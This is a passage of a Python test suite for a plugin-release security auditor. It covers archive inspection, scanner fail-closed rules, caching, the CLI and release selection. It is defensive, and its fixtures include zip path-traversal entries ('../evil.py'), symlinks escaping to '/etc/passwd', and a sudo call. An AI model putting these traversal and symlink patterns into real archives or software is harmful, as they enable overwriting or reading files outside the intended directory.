                patch.object(ap, "get_repo_file_raw", return_value=None),
                patch.object(ap, "download_zip", side_effect=fake_download),
                patch.object(ap, "run_clamav", return_value=_ok_clamav),
                patch.object(ap, "run_trivy", return_value=_ok_trivy) as mocked_trivy,
                patch.object(
                    ap,
                    "run_semgrep",
                    return_value=(
                        ap.ScannerStatus(name="semgrep", status="skipped"),
                        [],
                    ),
                ),
                patch.object(
                    ap,
                    "compare_source_and_artifact",
                    return_value=(
                        {},
                        [],
                        ap.ScannerStatus(name="source-artifact-diff", status="passed"),
                    ),
                ),
            ):
                report = ap.audit_repository(
                    "https://github.com/owner/my-plugin",
                    policy=ap._default_policy(),
                    exceptions=[],
                    cache_dir="/tmp/test-audit-cache",
                    skip_cache=True,
                )
            self.assertNotEqual(report.final_classification, "AUDIT_ERROR")
            self.assertEqual(report.plugin_name, "MyPlugin")
            self.assertEqual(
                mocked_trivy.call_args.kwargs["source_repo"],
                ("owner", "my-plugin", "commit123"),
            )
        finally:
            os.unlink(tf_path)

    def test_policy_demotes_audited_finding_without_dropping_it(self):
        zip_data = _make_zip(
            [
                _regular(
                    "my-plugin/plugin.json",
                    json.dumps({"name": "MyPlugin", "flags": []}),
                ),
                _regular(
                    "my-plugin/main.py",
                    'import subprocess\nsubprocess.run(["sudo", "true"])\n',
                ),
            ]
        )
        release = {
            "tag_name": "v1.0.0",
            "assets": [
                {
                    "name": "my-plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/my-plugin.zip",
                }
            ],
        }

        def fake_download(_url, dest_path, policy=None):
            del policy
            Path(dest_path).write_bytes(zip_data)
            return hashlib.sha256(zip_data).hexdigest()

        passed = ap.ScannerStatus(name="fixture", status="passed")
        with (
            patch.object(
                ap,
                "get_repo_metadata",
                return_value={"default_branch": "main", "archived": False},
            ),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(ap, "run_clamav", return_value=(passed, [])),
            patch.object(ap, "run_trivy", return_value=(passed, [])),
            patch.object(ap, "run_semgrep", return_value=(passed, [])),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {},
                    [],
                    ap.ScannerStatus(name="source-artifact-diff", status="passed"),
                ),
            ),
        ):
            policy = ap._default_policy()
            policy["rule_classifications"] = {"PRIVILEGE_SUDO": "PASS_WITH_WARNINGS"}
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=policy,
                exceptions=[],
                skip_cache=True,
            )

        sudo_finding = next(
            finding
            for finding in report.findings
            if finding.rule_id == "PRIVILEGE_SUDO"
        )
        self.assertEqual(sudo_finding.classification, "PASS_WITH_WARNINGS")
        self.assertEqual(report.final_classification, "PASS_WITH_WARNINGS")
        self.assertIn(
            "PRIVILEGE_SUDO", ap._rationale_rule_ids(report, "PASS_WITH_WARNINGS")
        )

    def test_archive_traversal_blocks(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("../evil.py", "bad")
        zip_data = buf.getvalue()

        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        # Archive is unsafe so scanners are never called; pass empty statuses.
        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
        ):
            # Disable required scanners so BLOCK is not masked by AUDIT_ERROR.
            policy = ap._default_policy()
            policy["scanners"]["clamav"]["required"] = False
            policy["scanners"]["trivy"]["required"] = False
            policy["scanners"]["source_artifact_diff"]["required"] = False
            report = ap.audit_repository(
                "https://github.com/owner/evil-plugin",
                policy=policy,
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "BLOCK")
        rule_ids = {f.rule_id for f in report.findings}
        self.assertIn("ARCHIVE_TRAVERSAL", rule_ids)

    def test_missing_repository_returns_audit_error(self):
        import requests as req

        mock_resp = MagicMock()
        mock_resp.status_code = 404
        err = req.HTTPError(response=mock_resp)
        with patch.object(ap, "get_repo_metadata", side_effect=err):
            report = ap.audit_repository(
                "https://github.com/owner/nonexistent",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "AUDIT_ERROR")

    def test_no_releases_returns_audit_error(self):
        meta = {"default_branch": "main", "archived": False}
        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[]),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/no-releases",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "AUDIT_ERROR")

    def test_metadata_prefers_release_tag_not_default_branch(self):
        zip_data = self._make_zip_with_metadata(
            plugin_name="ZipPlugin", package_name="zip-package"
        )
        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        def fake_get_repo_file_raw(owner, repo, ref, path):
            if ref == "v1.0.0" and path == "plugin.json":
                return json.dumps({"name": "TaggedPlugin", "flags": []}).encode()
            if ref == "v1.0.0" and path == "package.json":
                return json.dumps({"name": "tagged-package"}).encode()
            if ref == "main" and path == "plugin.json":
                return json.dumps({"name": "MainBranchPlugin", "flags": []}).encode()
            return None

        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(
                ap, "get_repo_file_raw", side_effect=fake_get_repo_file_raw
            ) as mocked_raw,
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {"ref": "v1.0.0", "checked": True},
                    [],
                    ap.ScannerStatus(name="source-artifact-diff", status="passed"),
                ),
            ),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.plugin_name, "TaggedPlugin")
        self.assertFalse(
            any(call.args[2] == "main" for call in mocked_raw.call_args_list)
        )

    def test_zip_metadata_used_when_tag_metadata_absent(self):
        zip_data = self._make_zip_with_metadata(
            plugin_name="ZipOnlyPlugin", package_name="zip-only-pkg"
        )
        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {"ref": "v1.0.0", "checked": True},
                    [],
                    ap.ScannerStatus(name="source-artifact-diff", status="passed"),
                ),
            ),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.plugin_name, "ZipOnlyPlugin")

    def test_missing_metadata_does_not_crash(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr("my-plugin/main.py", "# hello world\n")
        zip_data = buf.getvalue()
        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {"ref": "v1.0.0", "checked": True},
                    [],
                    ap.ScannerStatus(name="source-artifact-diff", status="passed"),
                ),
            ),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=ap._default_policy(),
                exceptions=[],
                skip_cache=True,
            )
        self.assertNotEqual(report.final_classification, "AUDIT_ERROR")
        self.assertTrue(
            any(f.rule_id == "MISSING_RELEASE_METADATA" for f in report.findings)
        )

    def test_required_source_diff_failure_is_audit_error(self):
        zip_data = self._make_simple_zip()
        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        policy = ap._default_policy()
        policy["scanners"]["source_artifact_diff"] = {"enabled": True, "required": True}
        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {"ref": "v1.0.0", "checked": False},
                    [],
                    ap.ScannerStatus(
                        name="source-artifact-diff", status="failed", detail="x"
                    ),
                ),
            ),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=policy,
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "AUDIT_ERROR")

    def test_optional_source_diff_failure_is_pass_with_warnings(self):
        zip_data = self._make_simple_zip()
        meta = {"default_branch": "main", "archived": False}
        release = {
            "tag_name": "v1.0.0",
            "prerelease": False,
            "assets": [
                {
                    "name": "plugin.zip",
                    "id": 1,
                    "browser_download_url": "https://example.com/plugin.zip",
                }
            ],
        }

        def fake_download(url, dest_path, policy=None):
            del url, policy
            Path(dest_path).write_bytes(zip_data)
            import hashlib

            return hashlib.sha256(zip_data).hexdigest()

        policy = ap._default_policy()
        policy["scanners"]["source_artifact_diff"] = {
            "enabled": True,
            "required": False,
        }
        with (
            patch.object(ap, "get_repo_metadata", return_value=meta),
            patch.object(ap, "get_releases", return_value=[release]),
            patch.object(ap, "get_repo_file_raw", return_value=None),
            patch.object(ap, "download_zip", side_effect=fake_download),
            patch.object(
                ap,
                "run_clamav",
                return_value=(ap.ScannerStatus(name="clamav", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_trivy",
                return_value=(ap.ScannerStatus(name="trivy", status="passed"), []),
            ),
            patch.object(
                ap,
                "run_semgrep",
                return_value=(ap.ScannerStatus(name="semgrep", status="skipped"), []),
            ),
            patch.object(
                ap,
                "compare_source_and_artifact",
                return_value=(
                    {"ref": "v1.0.0", "checked": False},
                    [],
                    ap.ScannerStatus(
                        name="source-artifact-diff", status="failed", detail="x"
                    ),
                ),
            ),
        ):
            report = ap.audit_repository(
                "https://github.com/owner/my-plugin",
                policy=policy,
                exceptions=[],
                skip_cache=True,
            )
        self.assertEqual(report.final_classification, "PASS_WITH_WARNINGS")
        self.assertTrue(
            any(
                s.name == "source-artifact-diff" and s.status == "failed"
                for s in report.scanner_statuses
            )
        )
        self.assertTrue(report.source_artifact_diff.get("checked") is False)


# ---------------------------------------------------------------------------
# Cache
# ---------------------------------------------------------------------------


class TestAuditCache(unittest.TestCase):
    def test_cache_key_is_deterministic(self):
        key1 = ap._cache_key(
            "https://github.com/owner/repo", "v1.0.0", "abc123", "ctx123", "commit123"
        )
        key2 = ap._cache_key(
            "https://github.com/owner/repo", "v1.0.0", "abc123", "ctx123", "commit123"
        )
        self.assertEqual(key1, key2)

    def test_cache_miss_returns_none(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = ap.load_cached_report(
                tmp, "https://github.com/x/y", "v1", "abc", "ctx123", "commit123"
            )
            self.assertIsNone(result)

    def test_cache_roundtrip(self):
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/repo",
            release="v1.0.0",
            artifact_sha256="a" * 64,
            final_classification="PASS",
        )
        with tempfile.TemporaryDirectory() as tmp:
            ap.save_cached_report(tmp, report, "v1.0.0@99", "ctx123", "commit123")
            loaded = ap.load_cached_report(
                tmp,
                "https://github.com/owner/repo",
                "v1.0.0@99",
                "a" * 64,
                "ctx123",
                "commit123",
            )
        self.assertIsNotNone(loaded)
        self.assertEqual(loaded.final_classification, "PASS")

    def test_different_sha_causes_cache_miss(self):
        report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/repo",
            release="v1.0.0",
            artifact_sha256="a" * 64,
            final_classification="PASS",
        )
        with tempfile.TemporaryDirectory() as tmp:
            ap.save_cached_report(tmp, report, "v1.0.0@99", "ctx123", "commit123")
            loaded = ap.load_cached_report(
                tmp,
                "https://github.com/owner/repo",
                "v1.0.0@99",
                "b" * 64,  # different SHA
                "ctx123",
                "commit123",
            )
        self.assertIsNone(loaded)


# ---------------------------------------------------------------------------
# CLI argument handling
# ---------------------------------------------------------------------------


class TestCLI(unittest.TestCase):
    def test_missing_mode_exits_error(self):
        with self.assertRaises(SystemExit) as ctx:
            ap.main([])
        self.assertNotEqual(ctx.exception.code, 0)

    def test_infrastructure_error_exits_1(self):
        """A repository-local enumeration error publishes output and exits 4."""
        error_report = ap.AuditReport(
            repository="https://github.com/owner/repo",
            final_classification="AUDIT_ERROR",
            completion_status="incomplete",
            error_scope="repository",
            errors=["network down"],
        )
        with (
            patch.object(
                ap, "read_repo_urls", return_value=["https://github.com/owner/repo"]
            ),
            patch.object(ap, "build_audit_worklist", return_value=([], [error_report])),
            tempfile.TemporaryDirectory() as tmp,
        ):
            code = ap.main(
                [
                    "--all",
                    "--plugins-file",
                    __file__,  # any existing file
                    "--output-dir",
                    tmp,
                    "--skip-cache",
                ]
            )
        self.assertEqual(code, 4)

    def test_report_only_mode_does_not_exit_2_on_block(self):
        """In report-only mode, BLOCK findings must not exit 2."""
        policy = ap._default_policy()
        policy["enforcement"]["mode"] = "report-only"

        block_report = ap.AuditReport(
            audit_timestamp="2026-01-01T00:00:00Z",
            repository="https://github.com/owner/bad-plugin",
            final_classification="BLOCK",
            artifact_sha256="a" * 64,
            completion_status="completed",
        )
        release = {
            "id": 1,
            "tag_name": "v1",
            "assets": [{"id": 10, "name": "plugin.zip"}],
        }
        work_item = ap.AuditWorkItem("https://github.com/owner/bad-plugin", release, {})

        with (
            patch.object(ap, "load_policy", return_value=policy),
            patch.object(ap, "load_allowlist", return_value=[]),
            patch.object(
                ap,
                "read_repo_urls",
                return_value=["https://github.com/owner/bad-plugin"],
            ),
            patch.object(ap, "build_audit_worklist", return_value=([work_item], [])),
            patch.object(ap, "audit_release", return_value=block_report),
            tempfile.TemporaryDirectory() as tmp,
        ):
            code = ap.main(
                [
                    "--all",
                    "--plugins-file",
                    __file__,
                    "--output-dir",
                    tmp,
                    "--skip-cache",
                ]
            )
        self.assertEqual(code, 0)


# ---------------------------------------------------------------------------
# find_best_release
# ---------------------------------------------------------------------------


class TestFindBestRelease(unittest.TestCase):
    def _make_release(self, tag: str, prerelease: bool, zips: int) -> dict:
        assets = [
            {"name": f"plugin{i}.zip", "browser_download_url": f"https://x/{i}.zip"}
            for i in range(zips)
        ]
        return {"tag_name": tag, "prerelease": prerelease, "assets": assets}

    def test_selects_latest_stable_with_one_zip(self):
        releases = [
            self._make_release("v2.0.0", False, 1),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v2.0.0")

    def test_skips_releases_with_zero_zips(self):
        releases = [
            self._make_release("v2.0.0", False, 0),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v1.0.0")

    def test_skips_releases_with_multiple_zips(self):
        releases = [
            self._make_release("v2.0.0", False, 2),
            self._make_release("v1.0.0", False, 1),
        ]
        r = ap.find_best_release(releases)
        self.assertEqual(r["tag_name"], "v1.0.0")

    def test_falls_back_to_prerelease_if_no_stable(self):
        releases = [self._make_release("v1.0.0-beta.1", True, 1)]
        r = ap.find_best_release(releases)
        self.assertIsNotNone(r)

    def test_no_eligible_release_returns_none(self):
        releases = [self._make_release("v1.0.0", False, 0)]
        self.assertIsNone(ap.find_best_release(releases))


# ---------------------------------------------------------------------------
# YAML loading (PyYAML-based)
# ---------------------------------------------------------------------------


class TestYamlLoading(unittest.TestCase):
    """Verify that _load_yaml uses PyYAML and preserves native types."""

    def _write(self, content: str) -> str:
        fd, path = tempfile.mkstemp(suffix=".yml")
        try:
            os.write(fd, content.encode())
        finally:
            os.close(fd)
        return path

    def test_integer_types_preserved(self):
        path = self._write(
            "archive:\n"
            "  max_files: 10000\n"
            "  max_uncompressed_bytes: 1073741824 # 1 GiB\n"
            "  max_compression_ratio: 200\n"
        )
        try:
            data = ap._load_yaml(path)
            self.assertIsInstance(data["archive"]["max_files"], int)
            self.assertEqual(data["archive"]["max_files"], 10000)
            self.assertIsInstance(data["archive"]["max_uncompressed_bytes"], int)
            self.assertEqual(data["archive"]["max_uncompressed_bytes"], 1073741824)
            self.assertIsInstance(data["archive"]["max_compression_ratio"], int)
            self.assertEqual(data["archive"]["max_compression_ratio"], 200)
        finally:
            os.unlink(path)

    def test_list_of_mappings_preserved(self):
        path = self._write(
            "version: '1'\n"
            "exceptions:\n"
            "  - repository: owner/repository\n"
            "    release: 1.0.0\n"
            "    artifact_sha256: abc123\n"
            "    rule: ROOT_ACCESS\n"
            "    reason: Required privileged helper\n"
            "    approved_by: zany130\n"
            "    expires: 2026-12-31\n"
        )
        try:
            data = ap._load_yaml(path)
            self.assertIsInstance(data["exceptions"], list)
            self.assertEqual(len(data["exceptions"]), 1)
            entry = data["exceptions"][0]
            self.assertIsInstance(entry, dict)
            self.assertEqual(entry["repository"], "owner/repository")
            self.assertEqual(entry["rule"], "ROOT_ACCESS")
        finally:
            os.unlink(path)

    def test_inline_comments_ignored(self):
        path = self._write(
            "key: value  # this is a comment\nnumber: 42   # another comment\n"
        )
        try:
            data = ap._load_yaml(path)
            self.assertEqual(data["key"], "value")
            self.assertEqual(data["number"], 42)
        finally:
            os.unlink(path)

    def test_boolean_preserved(self):
        path = self._write("enabled: true\ndisabled: false\n")
        try:
            data = ap._load_yaml(path)
            self.assertIs(data["enabled"], True)
            self.assertIs(data["disabled"], False)
        finally:
            os.unlink(path)

    def test_null_preserved(self):
        path = self._write("nothing: null\n")
        try:
            data = ap._load_yaml(path)
            self.assertIsNone(data["nothing"])
        finally:
            os.unlink(path)

    def test_non_mapping_top_level_raises(self):
        path = self._write("- item1\n- item2\n")
        try:
            with self.assertRaises(ValueError):
                ap._load_yaml(path)
        finally:
            os.unlink(path)

    def test_malformed_yaml_raises(self):
        path = self._write("key: [\n")  # unclosed bracket
        try:
            import yaml as _yaml

            with self.assertRaises((_yaml.YAMLError, ValueError)):
                ap._load_yaml(path)
        finally:
            os.unlink(path)


# ---------------------------------------------------------------------------
# Symlink boundary validation
# ---------------------------------------------------------------------------


class TestSymlinkBoundaryValidation(unittest.TestCase):
    """Regression tests for symlink escape detection in ZIP inspection."""

    def _make_symlink_zip(self, link_name: str, target: str) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo(link_name)
            # Set Unix symlink type bits (0xA in the high nibble of external_attr).
            info.external_attr = 0xA0000000
            zf.writestr(info, target)
        return buf.getvalue()

    def _check(self, link_name: str, target: str) -> list:
        data = self._make_symlink_zip(link_name, target)
        path = _make_temp_zip(data)
        try:
            _, findings = ap.inspect_zip(path)
        finally:
            os.unlink(path)
        return [f for f in findings if f.rule_id == "ARCHIVE_ESCAPE_SYMLINK"]

    def test_dotdot_escape_detected(self):
        findings = self._check("plugin/link", "../../etc/passwd")
        self.assertTrue(
            len(findings) > 0, "Expected ARCHIVE_ESCAPE_SYMLINK for ../../etc/passwd"
        )

    def test_dotdot_extract2_escape_detected(self):
        findings = self._check("plugin/link", "../../extract2/evil")
        self.assertTrue(
            len(findings) > 0, "Expected ARCHIVE_ESCAPE_SYMLINK for ../../extract2/evil"
        )

    def test_dotdot_extract_evil_escape_detected(self):
        findings = self._check("plugin/link", "../../extract-evil/evil")
        self.assertTrue(
            len(findings) > 0,
            "Expected ARCHIVE_ESCAPE_SYMLINK for ../../extract-evil/evil",
        )

    def test_absolute_target_blocked(self):
        findings = self._check("plugin/link", "/etc/passwd")
        self.assertTrue(
            len(findings) > 0,
            "Expected ARCHIVE_ESCAPE_SYMLINK for absolute /etc/passwd",
        )

    def test_safe_looking_escape_detected(self):
        # ../safe-looking/../../evil resolves to /extract/../evil = /evil — outside base
        findings = self._check("plugin/link", "../safe-looking/../../evil")
        self.assertTrue(
            len(findings) > 0,
            "Expected escape detection for ../safe-looking/../../evil",
        )

    def test_valid_internal_symlink_passes(self):
        # A symlink that stays inside the extraction base.
        findings = self._check("plugin/link", "../plugin/other.py")
        self.assertEqual(findings, [], "Valid internal symlink should not be flagged")

    def test_null_byte_in_target_blocked(self):
        data = self._make_symlink_zip("plugin/link", "safe\x00evil")
        path = _make_temp_zip(data)
        try:
            _, findings = ap.inspect_zip(path)
        finally:
            os.unlink(path)
        rule_ids = {f.rule_id for f in findings}
        self.assertIn("ARCHIVE_ESCAPE_SYMLINK", rule_ids)


# ---------------------------------------------------------------------------
# Required scanner fail-closed behaviour
# ---------------------------------------------------------------------------


class TestRequiredScannerFailClosed(unittest.TestCase):
    """Required scanner unavailable/failed → AUDIT_ERROR."""

    def _policy_with(
        self,
        clamav_enabled=True,
        clamav_required=True,
        trivy_enabled=True,
        trivy_required=True,
    ) -> dict:
        p = ap._default_policy()
        p["scanners"]["clamav"] = {
            "enabled": clamav_enabled,
            "required": clamav_required,
        }
        p["scanners"]["trivy"] = {"enabled": trivy_enabled, "required": trivy_required}
        p["scanners"]["semgrep"] = {"enabled": False, "required": False}
        p["scanners"]["osv_scanner"] = {"enabled": False, "required": False}
        return p

    def test_required_clamav_unavailable_is_audit_error(self):
        policy = self._policy_with(clamav_required=True)
        statuses = [
            ap.ScannerStatus(name="clamav", status="unavailable"),
            ap.ScannerStatus(name="trivy", status="passed"),
        ]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_required_clamav_failed_is_audit_error(self):
        policy = self._policy_with(clamav_required=True)
        statuses = [
            ap.ScannerStatus(name="clamav", status="failed"),
            ap.ScannerStatus(name="trivy", status="passed"),
        ]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_required_trivy_failed_is_audit_error(self):
        policy = self._policy_with(trivy_required=True)
        statuses = [
            ap.ScannerStatus(name="clamav", status="passed"),
            ap.ScannerStatus(name="trivy", status="failed"),
        ]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertEqual(cls, "AUDIT_ERROR")

    def test_optional_semgrep_unavailable_is_not_audit_error(self):
        policy = self._policy_with()
        policy["scanners"]["semgrep"] = {"enabled": True, "required": False}
        statuses = [
            ap.ScannerStatus(name="clamav", status="passed"),
            ap.ScannerStatus(name="trivy", status="passed"),
            ap.ScannerStatus(name="semgrep", status="unavailable"),
        ]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertNotEqual(cls, "AUDIT_ERROR")

    def test_disabled_scanner_skipped_no_error(self):
        policy = self._policy_with()
        policy["scanners"]["semgrep"] = {"enabled": False, "required": False}
        statuses = [
            ap.ScannerStatus(name="clamav", status="passed"),
            ap.ScannerStatus(name="trivy", status="passed"),
            ap.ScannerStatus(name="semgrep", status="skipped"),
        ]
        cls, _ = ap.classify_findings([], scanner_statuses=statuses, policy=policy)
        self.assertEqual(cls, "PASS")

    def test_malware_found_by_clamav_is_block(self):
        policy = self._policy_with()
        statuses = [
            ap.ScannerStatus(name="clamav", status="found_issue"),
            ap.ScannerStatus(name="trivy", status="passed"),
        ]
        findings = [
            ap.Finding(
                rule_id="MALWARE",
                severity="critical",
                classification="BLOCK",
                path="<redacted>/evil.py",
                line=0,
                message="ClamAV detected malware",
                evidence="Eicar-Test-Signature",
                scanner="clamav",
            )
        ]
        cls, _ = ap.classify_findings(
            findings, scanner_statuses=statuses, policy=policy
        )
        self.assertEqual(cls, "BLOCK")


# ---------------------------------------------------------------------------
# Trivy structured findings
# ---------------------------------------------------------------------------


class TestTrivyStructuredFindings(unittest.TestCase):
    """run_trivy must produce Finding objects with correct classification."""

    def _policy(self, block_sev="critical", review_sev="high") -> dict:
        p = ap._default_policy()
        p["vulnerabilities"]["block_severity"] = block_sev
        p["vulnerabilities"]["review_severity"] = review_sev
        return p

    def _trivy_json(self, vulns: list) -> str:
        return json.dumps(
            {"Results": [{"Target": "package-lock.json", "Vulnerabilities": vulns}]}
        )

    def _vuln(self, sev: str, vuln_id: str = "CVE-2024-0001") -> dict:
        return {
            "VulnerabilityID": vuln_id,
            "PkgName": "libfoo",
            "InstalledVersion": "1.0",
            "FixedVersion": "1.1",
            "Severity": sev.upper(),
            "References": ["https://nvd.nist.gov/vuln/detail/" + vuln_id],
            "Title": f"Test vulnerability ({sev})",
        }

    def _run(self, stdout: str, ok: bool = True, policy: dict = None) -> tuple:
        if policy is None:
            policy = self._policy()
        with (
            patch("shutil.which", return_value="/usr/bin/trivy"),
            patch.object(ap, "_run_scanner", return_value=(ok, stdout, "")),
        ):
            return ap.run_trivy("/tmp/fake", policy)

    def test_no_vulnerabilities_returns_passed(self):
        status, findings = self._run(self._trivy_json([]))
        self.assertEqual(status.status, "passed")
        self.assertEqual(findings, [])

    def test_critical_vuln_is_block(self):
        status, findings = self._run(self._trivy_json([self._vuln("critical")]))
        self.assertEqual(status.status, "found_issue")
        self.assertTrue(any(f.classification == "BLOCK" for f in findings))

    def test_high_vuln_is_manual_review(self):
        status, findings = self._run(self._trivy_json([self._vuln("high")]))
        self.assertEqual(status.status, "found_issue")
        self.assertTrue(any(f.classification == "MANUAL_REVIEW" for f in findings))

    def test_medium_vuln_is_pass_with_warnings(self):
        status, findings = self._run(self._trivy_json([self._vuln("medium")]))
        self.assertEqual(status.status, "found_issue")
        self.assertTrue(any(f.classification == "PASS_WITH_WARNINGS" for f in findings))

    def test_invalid_json_is_failed(self):
        status, findings = self._run("not json", ok=False)
        self.assertEqual(status.status, "failed")
        self.assertEqual(findings, [])

    def test_nonzero_exit_no_output_is_failed(self):
        status, findings = self._run("", ok=False)
        self.assertEqual(status.status, "failed")
        self.assertEqual(findings, [])

    def test_findings_preserved_but_status_failed_with_nonzero_exit(self):
        stdout = self._trivy_json([self._vuln("critical")])
        status, findings = self._run(stdout, ok=False)
        self.assertEqual(status.status, "failed")
        self.assertTrue(len(findings) > 0)

    def test_scans_artifact_and_exact_commit_source_lockfile(self):
        scanned_paths = []

        def fake_fetch(owner, repo, commit_sha, destination, policy=None):
            self.assertIsNotNone(policy)
            self.assertEqual((owner, repo, commit_sha), ("owner", "plugin", "abc123"))
            source_root = Path(destination) / "owner-plugin-abc123"
            source_root.mkdir()
            (source_root / "package-lock.json").write_text(
                json.dumps(
                    {
                        "name": "fixture",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {"name": "fixture"},
                            "node_modules/lodash": {"version": "4.17.20"},
                        },
                    }
                )
            )
            return str(source_root)

        def fake_scanner(args, _name, timeout=120):
